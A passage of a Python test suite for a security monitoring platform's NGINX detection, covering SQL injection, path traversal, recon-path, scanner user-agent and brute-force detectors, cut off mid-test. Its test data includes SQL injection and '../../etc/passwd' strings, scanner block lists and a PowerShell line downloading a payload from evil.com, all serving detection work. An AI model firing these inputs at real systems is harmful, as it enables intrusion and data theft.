"""
NGINX Detection Test Suite.

Tests ALL new NGINX detection capabilities added in the SOC platform enhancement:

  Rule Engine:
    - Built-in NGINX auth failure rule match
    - Built-in NGINX SQL injection rule match
    - Built-in NGINX path traversal rule match
    - Built-in NGINX recon scan rule match
    - Built-in NGINX suspicious user-agent rule match
    - Metadata conditions match operator coverage

  Correlation Engine:
    - _is_nginx_auth_failure() helper logic
    - _is_nginx_suspicious_request() helper logic
    - NGINX brute force detector (Detector 9)
    - NGINX recon scanning detector (Detector 10)

  Detection Engine:
    - _is_sql_injection_request() helper logic
    - _is_directory_traversal_request() helper logic
    - _is_recon_request() helper logic
    - _is_suspicious_user_agent() helper logic
    - NGINX auth failure detection
    - NGINX SQL injection detection
    - NGINX path traversal detection
    - NGINX recon path detection
    - NGINX suspicious user-agent detection
    - NGINX HTTP 5xx detection

  Regression Tests (existing detectors must be unaffected):
    - Malware detection (existing — must still work)
    - Critical severity detection (existing — must still work)
    - Unauthorized access detection (existing — must still work)
    - Blacklisted IP login failure (existing — must still work)
    - Windows event_type login_failed from non-blacklisted IP → not suspicious
    - Docker event → not triggering NGINX detectors
    - Rule engine DB rules still evaluated (PowerShell detection pattern)

Run from the backend directory:
    python -m pytest test_nginx_detection.py -v

Or to run a specific test class:
    python -m pytest test_nginx_detection.py::TestDetectionServiceNGINX -v
"""

import sys
import threading
import unittest
from collections import deque
from datetime import datetime, timedelta, timezone
from unittest.mock import MagicMock, patch

sys.path.insert(0, ".")

from app.schemas.log import NormalizedSOCLog, DetectionResult, Severity
from app.services.detection_service import DetectionService
from app.services.rule_engine_service import RuleEngineService, _BUILTIN_NGINX_RULES
from app.services.correlation_service import (
    CorrelationService,
    NGINX_BRUTE_FORCE_THRESHOLD,
    NGINX_BRUTE_FORCE_WINDOW,
    NGINX_RECON_PATH_THRESHOLD,
    NGINX_RECON_WINDOW,
)


# ---------------------------------------------------------------------------
# Shared Test Helpers
# ---------------------------------------------------------------------------

def _make_normalized_log(
    source: str = "nginx",
    event_type: str = "nginx.access",
    message: str = "NGINX access log",
    severity: Severity = Severity.medium,
    source_ip: str | None = "1.2.3.4",
    user: str | None = None,
    host: str | None = "web-server-01",
    metadata: dict | None = None,
) -> NormalizedSOCLog:
    """Creates a NormalizedSOCLog for testing with sensible NGINX defaults."""
    return NormalizedSOCLog(
        source=source,
        event_type=event_type,
        message=message,
        severity=severity,
        timestamp=datetime.now(timezone.utc),
        source_ip=source_ip,
        user=user,
        host=host,
        metadata=metadata or {},
    )


def _nginx_auth_failure_log(
    source_ip: str = "1.2.3.4",
    request_uri: str = "/login",
    user_agent: str = "Mozilla/5.0",
) -> NormalizedSOCLog:
    """Helper: creates a typical NGINX 401 auth failure log."""
    return _make_normalized_log(
        source="nginx",
        source_ip=source_ip,
        metadata={
            "http_method": "POST",
            "request_uri": request_uri,
            "status_code": "401",
            "user_agent": user_agent,
        },
    )


def _nginx_recon_log(
    source_ip: str = "1.2.3.4",
    request_uri: str = "/.git",
    status_code: str = "404",
) -> NormalizedSOCLog:
    """Helper: creates a typical NGINX recon scan log."""
    return _make_normalized_log(
        source="nginx",
        source_ip=source_ip,
        metadata={
            "http_method": "GET",
            "request_uri": request_uri,
            "status_code": status_code,
        },
    )


def _make_snapshot(
    source: str = "nginx",
    source_ip: str | None = "1.2.3.4",
    host: str | None = "web-01",
    http_method: str = "POST",
    request_uri: str = "/login",
    status_code: str = "401",
    user_agent: str = "Mozilla/5.0",
    event_type: str = "nginx.access",
) -> dict:
    """Creates a correlation engine event snapshot for testing."""
    return {
        "timestamp": datetime.now(timezone.utc),
        "event_type": event_type,
        "host": host,
        "source": source,
        "user": None,
        "source_ip": source_ip,
        "severity": "medium",
        "rule_matches": [],
        "risk_score": 0,
        "event_fingerprint": "test_fingerprint",
        "log_type": "nginx_access",
        "http_method": http_method,
        "request_uri": request_uri,
        "status_code": status_code,
        "user_agent": user_agent,
    }


# ===========================================================================
# Rule Engine Tests (New NGINX Capabilities)
# ===========================================================================

class TestRuleEngineMetadataConditions(unittest.TestCase):
    """Tests for the new _metadata_conditions_match() method."""

    def setUp(self):
        self.engine = RuleEngineService()

    def test_eq_operator_match(self):
        log = _make_normalized_log(metadata={"status_code": "401"})
        conditions = {"status_code": {"op": "eq", "value": "401"}}
        self.assertTrue(self.engine._metadata_conditions_match(log, conditions))

    def test_eq_operator_no_match(self):
        log = _make_normalized_log(metadata={"status_code": "200"})
        conditions = {"status_code": {"op": "eq", "value": "401"}}
        self.assertFalse(self.engine._metadata_conditions_match(log, conditions))

    def test_eq_operator_case_insensitive(self):
        log = _make_normalized_log(metadata={"status_code": "401"})
        conditions = {"status_code": {"op": "eq", "value": "401"}}
        self.assertTrue(self.engine._metadata_conditions_match(log, conditions))

    def test_contains_operator_match(self):
        log = _make_normalized_log(metadata={"request_uri": "/login/page"})
        conditions = {"request_uri": {"op": "contains", "value": "/login"}}
        self.assertTrue(self.engine._metadata_conditions_match(log, conditions))

    def test_contains_any_operator_match(self):
        log = _make_normalized_log(metadata={"user_agent": "sqlmap/1.0"})
        conditions = {"user_agent": {"op": "contains_any", "values": ["sqlmap", "nikto"]}}
        self.assertTrue(self.engine._metadata_conditions_match(log, conditions))

    def test_contains_any_operator_no_match(self):
        log = _make_normalized_log(metadata={"user_agent": "Mozilla/5.0"})
        conditions = {"user_agent": {"op": "contains_any", "values": ["sqlmap", "nikto"]}}
        self.assertFalse(self.engine._metadata_conditions_match(log, conditions))

    def test_startswith_any_operator_match(self):
        log = _make_normalized_log(metadata={"request_uri": "/.git/config"})
        conditions = {"request_uri": {"op": "startswith_any", "paths": ["/.git", "/.env"]}}
        self.assertTrue(self.engine._metadata_conditions_match(log, conditions))

    def test_startswith_any_operator_no_match(self):
        log = _make_normalized_log(metadata={"request_uri": "/api/data"})
        conditions = {"request_uri": {"op": "startswith_any", "paths": ["/.git", "/.env"]}}
        self.assertFalse(self.engine._metadata_conditions_match(log, conditions))

    def test_regex_any_operator_sql_injection(self):
        log = _make_normalized_log(metadata={"request_uri": "/login?id=1 union select 1,2,3"})
        conditions = {
            "request_uri": {"op": "regex_any", "patterns": [r"union[\s\+]+select"]}
        }
        self.assertTrue(self.engine._metadata_conditions_match(log, conditions))

    def test_missing_metadata_field_returns_false(self):
        log = _make_normalized_log(metadata={})  # no status_code
        conditions = {"status_code": {"op": "eq", "value": "401"}}
        self.assertFalse(self.engine._metadata_conditions_match(log, conditions))

    def test_empty_metadata_returns_false(self):
        log = _make_normalized_log(metadata=None)
        conditions = {"status_code": {"op": "eq", "value": "401"}}
        self.assertFalse(self.engine._metadata_conditions_match(log, conditions))

    def test_all_conditions_must_match_and_logic(self):
        """Both conditions must be true (AND semantics)."""
        log = _make_normalized_log(metadata={"status_code": "401", "http_method": "GET"})
        conditions = {
            "status_code": {"op": "eq", "value": "401"},
            "http_method": {"op": "eq", "value": "POST"},  # GET != POST — should fail
        }
        self.assertFalse(self.engine._metadata_conditions_match(log, conditions))

    def test_unknown_operator_returns_false(self):
        log = _make_normalized_log(metadata={"status_code": "401"})
        conditions = {"status_code": {"op": "unsupported_op", "value": "401"}}
        self.assertFalse(self.engine._metadata_conditions_match(log, conditions))


class TestBuiltinNGINXRules(unittest.TestCase):
    """Tests that each built-in NGINX rule correctly matches/does not match logs."""

    def setUp(self):
        self.engine = RuleEngineService()

    def _eval_builtin_rules(self, log: NormalizedSOCLog) -> list[str]:
        """Returns list of rule_codes that matched from BUILTIN_NGINX_RULES."""
        matches = self.engine._evaluate_pattern_rules(log, _BUILTIN_NGINX_RULES)
        return [m["rule_code"] for m in matches]

    # ── NGINX_AUTH_FAILURE ───────────────────────────────────────────────────

    def test_auth_failure_rule_matches_401(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"status_code": "401", "request_uri": "/login"},
        )
        self.assertIn("NGINX_AUTH_FAILURE", self._eval_builtin_rules(log))

    def test_auth_failure_rule_no_match_200(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"status_code": "200", "request_uri": "/login"},
        )
        self.assertNotIn("NGINX_AUTH_FAILURE", self._eval_builtin_rules(log))

    def test_auth_failure_rule_no_match_non_nginx_source(self):
        log = _make_normalized_log(
            source="windows",
            metadata={"status_code": "401"},
        )
        self.assertNotIn("NGINX_AUTH_FAILURE", self._eval_builtin_rules(log))

    # ── NGINX_SQL_INJECTION ──────────────────────────────────────────────────

    def test_sql_injection_rule_matches_union_select(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"request_uri": "/search?q=1 union select 1,2,3"},
        )
        self.assertIn("NGINX_SQL_INJECTION", self._eval_builtin_rules(log))

    def test_sql_injection_rule_matches_or_1_1(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"request_uri": "/login?user=admin' or '1'='1"},
        )
        self.assertIn("NGINX_SQL_INJECTION", self._eval_builtin_rules(log))

    def test_sql_injection_rule_no_match_normal_uri(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"request_uri": "/api/users/42"},
        )
        self.assertNotIn("NGINX_SQL_INJECTION", self._eval_builtin_rules(log))

    # ── NGINX_PATH_TRAVERSAL ─────────────────────────────────────────────────

    def test_path_traversal_rule_matches_dotdot(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"request_uri": "/files/../../etc/passwd"},
        )
        self.assertIn("NGINX_PATH_TRAVERSAL", self._eval_builtin_rules(log))

    def test_path_traversal_rule_matches_etc_passwd(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"request_uri": "/etc/passwd"},
        )
        self.assertIn("NGINX_PATH_TRAVERSAL", self._eval_builtin_rules(log))

    def test_path_traversal_rule_no_match_normal(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"request_uri": "/api/files/document.pdf"},
        )
        self.assertNotIn("NGINX_PATH_TRAVERSAL", self._eval_builtin_rules(log))

    # ── NGINX_RECON_SCAN ────────────────────────────────────────────────────

    def test_recon_rule_matches_git(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"request_uri": "/.git/config"},
        )
        self.assertIn("NGINX_RECON_SCAN", self._eval_builtin_rules(log))

    def test_recon_rule_matches_admin(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"request_uri": "/admin/users"},
        )
        self.assertIn("NGINX_RECON_SCAN", self._eval_builtin_rules(log))

    def test_recon_rule_no_match_normal_path(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"request_uri": "/api/products"},
        )
        self.assertNotIn("NGINX_RECON_SCAN", self._eval_builtin_rules(log))

    # ── NGINX_SUSPICIOUS_UA ──────────────────────────────────────────────────

    def test_suspicious_ua_rule_matches_sqlmap(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"user_agent": "sqlmap/1.7.6#stable"},
        )
        self.assertIn("NGINX_SUSPICIOUS_UA", self._eval_builtin_rules(log))

    def test_suspicious_ua_rule_matches_nikto(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"user_agent": "Nikto/2.1.6"},
        )
        self.assertIn("NGINX_SUSPICIOUS_UA", self._eval_builtin_rules(log))

    def test_suspicious_ua_rule_no_match_normal_browser(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={"user_agent": "Mozilla/5.0 Chrome/120"},
        )
        self.assertNotIn("NGINX_SUSPICIOUS_UA", self._eval_builtin_rules(log))


# ===========================================================================
# Detection Engine Tests (New NGINX Capabilities)
# ===========================================================================

class TestDetectionServiceNGINX(unittest.TestCase):
    """Tests for the new NGINX metadata-aware detection methods."""

    def setUp(self):
        self.service = DetectionService()

    # ── Helper method unit tests ─────────────────────────────────────────────

    def test_is_sql_injection_union_select(self):
        self.assertTrue(self.service._is_sql_injection_request("?id=1 union select 1,2,3"))

    def test_is_sql_injection_or_1_equals_1(self):
        self.assertTrue(self.service._is_sql_injection_request("?u=admin' or '1'='1"))

    def test_is_sql_injection_drop_table(self):
        self.assertTrue(self.service._is_sql_injection_request("/api; drop table users"))

    def test_is_sql_injection_no_match(self):
        self.assertFalse(self.service._is_sql_injection_request("/api/users?page=1"))

    def test_is_sql_injection_empty(self):
        self.assertFalse(self.service._is_sql_injection_request(""))

    def test_is_directory_traversal_dotdot_slash(self):
        self.assertTrue(self.service._is_directory_traversal_request("/files/../../etc/passwd"))

    def test_is_directory_traversal_encoded(self):
        self.assertTrue(self.service._is_directory_traversal_request("/files/%2e%2e%2fetc"))

    def test_is_directory_traversal_etc_passwd(self):
        self.assertTrue(self.service._is_directory_traversal_request("/etc/passwd"))

    def test_is_directory_traversal_no_match(self):
        self.assertFalse(self.service._is_directory_traversal_request("/api/files/doc.pdf"))

    def test_is_directory_traversal_empty(self):
        self.assertFalse(self.service._is_directory_traversal_request(""))

    def test_is_recon_git(self):
        self.assertTrue(self.service._is_recon_request("/.git/config"))

    def test_is_recon_env(self):
        self.assertTrue(self.service._is_recon_request("/.env"))

    def test_is_recon_admin(self):
        self.assertTrue(self.service._is_recon_request("/admin/panel"))

    def test_is_recon_wp_config(self):
        self.assertTrue(self.service._is_recon_request("/wp-config.php"))

    def test_is_recon_no_match(self):
        self.assertFalse(self.service._is_recon_request("/api/products"))

    def test_is_suspicious_ua_sqlmap(self):
        self.assertTrue(self.service._is_suspicious_user_agent("sqlmap/1.7"))

    def test_is_suspicious_ua_nikto(self):
        self.assertTrue(self.service._is_suspicious_user_agent("Nikto/2.1"))

    def test_is_suspicious_ua_normal_browser(self):
        self.assertFalse(self.service._is_suspicious_user_agent("Mozilla/5.0 Chrome/120"))

    def test_is_suspicious_ua_empty(self):
        self.assertFalse(self.service._is_suspicious_user_agent(""))

    # ── analyze() integration tests for NGINX scenarios ─────────────────────

    def test_nginx_auth_failure_detected(self):
        log = _nginx_auth_failure_log(request_uri="/login")
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.high)
        self.assertIn("401", result.reason)

    def test_nginx_sql_injection_detected(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={
                "http_method": "POST",
                "request_uri": "/login",
                "query_string": "user=admin' or '1'='1",
                "status_code": "200",
            },
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.critical)
        self.assertIn("SQL injection", result.reason)

    def test_nginx_path_traversal_detected(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={
                "http_method": "GET",
                "request_uri": "/files/../../etc/passwd",
                "status_code": "200",
            },
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.high)
        self.assertIn("traversal", result.reason)

    def test_nginx_recon_path_detected(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={
                "http_method": "GET",
                "request_uri": "/.git/config",
                "status_code": "404",
            },
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.medium)

    def test_nginx_suspicious_ua_detected(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={
                "http_method": "GET",
                "request_uri": "/api/users",
                "status_code": "200",
                "user_agent": "sqlmap/1.7.6",
            },
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.high)
        self.assertIn("sqlmap", result.reason)

    def test_nginx_http_500_detected(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={
                "http_method": "GET",
                "request_uri": "/api/data",
                "status_code": "500",
            },
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.medium)

    def test_nginx_normal_request_not_suspicious(self):
        log = _make_normalized_log(
            source="nginx",
            metadata={
                "http_method": "GET",
                "request_uri": "/api/products",
                "status_code": "200",
                "user_agent": "Mozilla/5.0",
            },
        )
        result = self.service.analyze(log)
        self.assertFalse(result.is_suspicious)

    def test_sql_injection_priority_over_auth_failure(self):
        """SQLi check runs before auth failure check — should return critical."""
        log = _make_normalized_log(
            source="nginx",
            metadata={
                "http_method": "POST",
                "request_uri": "/login",
                "query_string": "user=1 union select 1,2",
                "status_code": "401",
            },
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.critical)


# ===========================================================================
# Detection Engine Regression Tests (Existing Logic Must Be Unaffected)
# ===========================================================================

class TestDetectionServiceRegression(unittest.TestCase):
    """
    Verifies that all 4 existing detection checks still produce exactly
    the same results after the NGINX enhancement was added.
    """

    def setUp(self):
        self.service = DetectionService()

    def test_critical_severity_still_detected(self):
        log = _make_normalized_log(
            source="firewall",
            event_type="system.failure",
            severity=Severity.critical,
            metadata={},
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.critical)
        self.assertEqual(result.reason, "Critical severity log event")

    def test_malware_event_type_still_detected(self):
        log = _make_normalized_log(
            source="edr",
            event_type="malware.detected",
            severity=Severity.high,
            metadata={},
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.high)
        self.assertEqual(result.reason, "Malware activity detected")

    def test_unauthorized_event_type_still_detected(self):
        log = _make_normalized_log(
            source="auth-gw",
            event_type="unauthorized_access",
            severity=Severity.medium,
            metadata={},
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.high)
        self.assertEqual(result.reason, "Unauthorized access attempt")

    def test_blacklisted_ip_login_failed_still_detected(self):
        log = _make_normalized_log(
            source="ssh",
            event_type="login_failed",
            source_ip="192.168.1.10",  # in _BLACKLISTED_IPS
            metadata={},
        )
        result = self.service.analyze(log)
        self.assertTrue(result.is_suspicious)
        self.assertEqual(result.severity, Severity.high)
        self.assertEqual(result.reason, "Login failure from blacklisted IP")

    def test_windows_login_failed_non_blacklisted_not_suspicious(self):
        """Existing behaviour: login_failed from non-blacklisted IP is NOT suspicious."""
        log = _make_normalized_log(
            source="windows",
            event_type="login_failed",
            source_ip="10.0.1.50",  # NOT in blacklist
            metadata={},
        )
        result = self.service.analyze(log)
        self.assertFalse(result.is_suspicious)

    def test_docker_event_does_not_trigger_nginx_detectors(self):
        """Docker logs must not be caught by NGINX-specific detection."""
        log = _make_normalized_log(
            source="docker",
            event_type="container.restart",
            severity=Severity.low,
            metadata={
                "container_id": "abc123",
                "status_code": "401",  # present but source is not nginx
            },
        )
        result = self.service.analyze(log)
        # Without event_type triggers or nginx source, this is not suspicious
        self.assertFalse(result.is_suspicious)


# ===========================================================================
# Correlation Engine Tests (New NGINX Detectors)
# ===========================================================================

class TestCorrelationEngineHelpers(unittest.TestCase):
    """Tests for _is_nginx_auth_failure() and _is_nginx_suspicious_request()."""

    def setUp(self):
        self.service = CorrelationService()

    # _is_nginx_auth_failure ---------------------------------------------------

    def test_auth_failure_post_login_401(self):
        snap = _make_snapshot(http_method="POST", request_uri="/login", status_code="401")
        self.assertTrue(self.service._is_nginx_auth_failure(snap))

    def test_auth_failure_post_signin_401(self):
        snap = _make_snapshot(http_method="POST", request_uri="/signin", status_code="401")
        self.assertTrue(self.service._is_nginx_auth_failure(snap))

    def test_auth_failure_post_auth_401(self):
        snap = _make_snapshot(http_method="POST", request_uri="/api/auth/token", status_code="401")
        self.assertTrue(self.service._is_nginx_auth_failure(snap))

    def test_auth_failure_get_login_401_is_false(self):
        """GET /login 401 is NOT considered a credential submission."""
        snap = _make_snapshot(http_method="GET", request_uri="/login", status_code="401")
        self.assertFalse(self.service._is_nginx_auth_failure(snap))

    def test_auth_failure_post_login_200_is_false(self):
        snap = _make_snapshot(http_method="POST", request_uri="/login", status_code="200")
        self.assertFalse(self.service._is_nginx_auth_failure(snap))

    def test_auth_failure_post_other_uri_401_is_false(self):
        snap = _make_snapshot(http_method="POST", request_uri="/api/data", status_code="401")
        self.assertFalse(self.service._is_nginx_auth_failure(snap))

    # _is_nginx_suspicious_request -------------------------------------------

    def test_suspicious_git_path_404(self):
        snap = _make_snapshot(
            source="nginx", request_uri="/.git/config", status_code="404"
        )
        self.assertTrue(self.service._is_nginx_suspicious_request(snap))

    def test_suspicious_admin_path_403(self):
        snap = _make_snapshot(
            source="nginx", request_uri="/admin/panel", status_code="403"
        )
        self.assertTrue(self.service._is_nginx_suspicious_request(snap))

    def test_suspicious_non_nginx_source_is_false(self):
        snap = _make_snapshot(
            source="docker", request_uri="/.git/config", status_code="404"
        )
        self.assertFalse(self.service._is_nginx_suspicious_request(snap))

    def test_suspicious_200_response_is_false(self):
        snap = _make_snapshot(
            source="nginx", request_uri="/.git/config", status_code="200"
        )
        self.assertFalse(self.service._is_nginx_suspicious_request(snap))

    def test_suspicious_non_recon_path_is_false(self):
        snap = _make_snapshot(
            source="nginx", request_uri="/api/products", status_code="404"
        )
        self.assertFalse(self.service._is_nginx_suspicious_request(snap))


class TestNGINXBruteForceDetector(unittest.TestCase):
    """Tests for _detect_nginx_brute_force() (Detector 9)."""

    def setUp(self):
        self.service = CorrelationService()
        self.now = datetime.now(timezone.utc)

    def _inject_snapshots(self, count: int, source_ip: str = "1.2.3.4"):
        """Directly inject auth failure snapshots into the IP cache."""
        with self.service._lock:
            for _ in range(count):
                snap = _make_snapshot(source_ip=source_ip)
                snap["timestamp"] = self.now
                self.service._source_ip_cache[source_ip].append(snap)

    def test_brute_force_fires_at_threshold(self):
        source_ip = "10.0.0.1"
        self._inject_snapshots(NGINX_BRUTE_FORCE_THRESHOLD, source_ip)

        current_snap = _make_snapshot(source_ip=source_ip)
        current_snap["timestamp"] = self.now

        result = self.service._detect_nginx_brute_force(current_snap, self.now)
        self.assertIsNotNone(result)
        self.assertEqual(result["correlation_type"], "nginx_brute_force")
        self.assertEqual(result["severity"], "high")

    def test_brute_force_does_not_fire_below_threshold(self):
        source_ip = "10.0.0.2"
        self._inject_snapshots(NGINX_BRUTE_FORCE_THRESHOLD - 1, source_ip)

        current_snap = _make_snapshot(source_ip=source_ip)
        current_snap["timestamp"] = self.now

        result = self.service._detect_nginx_brute_force(current_snap, self.now)
        self.assertIsNone(result)

    def test_brute_force_does_not_fire_for_non_auth_failure(self):
        source_ip = "10.0.0.3"
        # Inject 200 OK requests (not auth failures)
        with self.service._lock:
            for _ in range(10):
                snap = _make_snapshot(source_ip=source_ip, status_code="200")
                snap["timestamp"] = self.now
                self.service._source_ip_cache[source_ip].append(snap)

        current_snap = _make_snapshot(source_ip=source_ip, status_code="200")
        result = self.service._detect_nginx_brute_force(current_snap, self.now)
        self.assertIsNone(result)

    def test_brute_force_does_not_fire_without_source_ip(self):
        current_snap = _make_snapshot(source_ip=None)
        current_snap["source_ip"] = None
        result = self.service._detect_nginx_brute_force(current_snap, self.now)
        self.assertIsNone(result)

    def test_brute_force_ignores_expired_events(self):
        """Events older than the window should not count toward threshold."""
        source_ip = "10.0.0.4"
        old_time = self.now - NGINX_BRUTE_FORCE_WINDOW - timedelta(seconds=10)
        with self.service._lock:
            for _ in range(NGINX_BRUTE_FORCE_THRESHOLD + 2):
                snap = _make_snapshot(source_ip=source_ip)
                snap["timestamp"] = old_time  # Expired
                self.service._source_ip_cache[source_ip].append(snap)

        current_snap = _make_snapshot(source_ip=source_ip)
        current_snap["timestamp"] = self.now
        result = self.service._detect_nginx_brute_force(current_snap, self.now)
        self.assertIsNone(result)


class TestNGINXReconScanningDetector(unittest.TestCase):
    """Tests for _detect_nginx_recon_scanning() (Detector 10)."""

    def setUp(self):
        self.service = CorrelationService()
        self.now = datetime.now(timezone.utc)

    def _inject_recon_snapshots(
        self, paths: list[str], source_ip: str = "1.2.3.4", status_code: str = "404"
    ):
        with self.service._lock:
            for path in paths:
                snap = _make_snapshot(
                    source="nginx",
                    source_ip=source_ip,
                    request_uri=path,
                    status_code=status_code,
                    http_method="GET",
                )
                snap["timestamp"] = self.now
                self.service._source_ip_cache[source_ip].append(snap)

    def test_recon_fires_at_threshold(self):
        source_ip = "10.1.0.1"
        paths = ["/.git", "/.env", "/admin", "/config", "/backup"]  # 5 distinct paths
        self._inject_recon_snapshots(paths, source_ip)

        current_snap = _make_snapshot(
            source="nginx",
            source_ip=source_ip,
            request_uri="/.htaccess",
            status_code="404",
            http_method="GET",
        )
        current_snap["timestamp"] = self.now
        result = self.service._detect_nginx_recon_scanning(current_snap, self.now)
        self.assertIsNotNone(result)
        self.assertEqual(result["correlation_type"], "nginx_recon_scanning")

    def test_recon_does_not_fire_below_threshold(self):
        source_ip = "10.1.0.2"
        paths = ["/.git", "/.env", "/admin"]  # Only 3 — below threshold of 5
        self._inject_recon_snapshots(paths, source_ip)

        current_snap = _make_snapshot(
            source="nginx",
            source_ip=source_ip,
            request_uri="/.git",
            status_code="404",
            http_method="GET",
        )
        current_snap["timestamp"] = self.now
        result = self.service._detect_nginx_recon_scanning(current_snap, self.now)
        self.assertIsNone(result)

    def test_recon_does_not_fire_for_non_nginx_source(self):
        source_ip = "10.1.0.3"
        with self.service._lock:
            for path in ["/.git", "/.env", "/admin", "/config", "/backup"]:
                snap = _make_snapshot(
                    source="docker",  # Not nginx
                    source_ip=source_ip,
                    request_uri=path,
                    status_code="404",
                )
                snap["timestamp"] = self.now
                self.service._source_ip_cache[source_ip].append(snap)

        current_snap = _make_snapshot(source="docker", source_ip=source_ip, status_code="404")
        current_snap["timestamp"] = self.now
        result = self.service._detect_nginx_recon_scanning(current_snap, self.now)
        self.assertIsNone(result)

    def test_recon_severity_escalates_at_10_paths(self):
        source_ip = "10.1.0.4"
        paths = [
            "/.git", "/.env", "/admin", "/config", "/backup",
            "/phpinfo", "/wp-admin", "/wp-config", "/server-status", "/actuator",
            "/debug",  # 11 distinct paths → high severity
        ]
        self._inject_recon_snapshots(paths, source_ip)

        current_snap = _make_snapshot(
            source="nginx",
            source_ip=source_ip,
            request_uri="/.htaccess",
            status_code="404",
            http_method="GET",
        )
        current_snap["timestamp"] = self.now
        result = self.service._detect_nginx_recon_scanning(current_snap, self.now)
        self.assertIsNotNone(result)
        self.assertEqual(result["severity"], "high")


# ===========================================================================
# Correlation Engine Regression Tests (Existing Detectors Unaffected)
# ===========================================================================

class TestCorrelationEngineRegression(unittest.TestCase):
    """
    Verifies existing detectors still work correctly after new NGINX detectors
    were added. Uses snapshots that should NOT trigger NGINX detectors.
    """

    def setUp(self):
        self.service = CorrelationService()
        self.now = datetime.now(timezone.utc)

    def test_existing_failed_login_burst_still_triggers_on_login_failed_event_type(self):
        """Existing Detector 1 must still fire on 'login_failed' event_type."""
        user = "admin"
        source_ip = "192.168.50.1"

        with self.service._lock:
            for _ in range(6):
                snap = {
                    "timestamp": self.now,
                    "event_type": "login_failed",
                    "host": "win-dc-01",
                    "source": "windows",
                    "user": user,
                    "source_ip": source_ip,
                    "severity": "medium",
                    "rule_matches": [],
                    "risk_score": 0,
                    "event_fingerprint": "win_fp",
                    "log_type": "windows_event",
                    "http_method": "",
                    "request_uri": "",
                    "status_code": "",
                    "user_agent": "",
                }
                self.service._source_ip_cache[source_ip].append(snap)
                self.service._user_cache[user].append(snap)

        trigger_snap = {
            "timestamp": self.now,
            "event_type": "login_failed",
            "host": "win-dc-01",
            "source": "windows",
            "user": user,
            "source_ip": source_ip,
            "severity": "medium",
            "rule_matches": [],
            "risk_score": 0,
            "event_fingerprint": "win_fp",
            "log_type": "windows_event",
            "http_method": "",
            "request_uri": "",
            "status_code": "",
            "user_agent": "",
        }
        result = self.service._detect_failed_login_burst(trigger_snap, self.now)
        self.assertIsNotNone(result)
        self.assertEqual(result["correlation_type"], "failed_login_burst")

    def test_nginx_auth_failure_does_not_trigger_existing_failed_login_burst(self):
        """
        NGINX auth failures must NOT trigger Detector 1 (which requires
        'login' + 'fail' in event_type). This validates no cross-contamination.
        """
        snap = _make_snapshot(
            event_type="nginx.access",  # does not contain 'login' or 'fail'
            http_method="POST",
            request_uri="/login",
            status_code="401",
        )
        result = self.service._detect_failed_login_burst(snap, self.now)
        self.assertIsNone(result)

    def test_non_nginx_snapshot_does_not_trigger_nginx_brute_force(self):
        """Windows login_failed events must not trigger NGINX brute force detector."""
        snap = {
            "timestamp": self.now,
            "event_type": "login_failed",
            "host": "win-dc",
            "source": "windows",
            "user": "administrator",
            "source_ip": "192.168.1.5",
            "severity": "medium",
            "rule_matches": [],
            "risk_score": 0,
            "event_fingerprint": "wp",
            "log_type": "windows_event",
            "http_method": "POST",        # has method but no login URI
            "request_uri": "",
            "status_code": "401",
            "user_agent": "",
        }
        result = self.service._detect_nginx_brute_force(snap, self.now)
        # /request_uri/ is empty, so _is_nginx_auth_failure returns False
        self.assertIsNone(result)


# ===========================================================================
# Rule Engine Regression Test
# ===========================================================================

class TestRuleEngineRegression(unittest.TestCase):
    """
    Verifies that existing DB-rule evaluation behaviour is unchanged
    after the built-in NGINX rules were added.
    """

    def test_existing_powershell_rule_still_matches(self):
        """The existing POWERSHELL_EXEC rule (DB rule) must still evaluate correctly."""
        engine = RuleEngineService()
        engine._rules = [
            {
                "rule_code": "POWERSHELL_EXEC",
                "rule_name": "PowerShell Detection",
                "rule_type": "pattern",
                "severity": "high",
                "risk_score": 80,
                "source_type": "powershell",
                "event_type_pattern": None,
                "message_pattern": None,
                "metadata_conditions": None,
                "threshold_count": None,
                "threshold_minutes": None,
            }
        ]
        engine._rules_loaded = True

        log = _make_normalized_log(
            source="powershell",
            event_type="process.execution",
            message="Invoke-WebRequest http://evil.com/payload.exe",
        )
        matches = engine.evaluate_rules(log)
        codes = [m["rule_code"] for m in matches]
        self.assertIn("POWERSHELL_EXEC", codes)

    def test_existing_rule_with_no_metadata_conditions_still_works(self):
        """Rules without metadata_conditions must work exactly as before."""
        engine = RuleEngineService()
        engine._rules = [
            {
                "rule_code": "TEST_MSG_PATTERN",
                "rule_name": "Test Message Pattern",
                "rule_type": "pattern",
                "severity": "medium",
                "risk_score": 40,
                "source_type": None,
                "event_type_pattern": None,
                "message_pattern": "failed login",
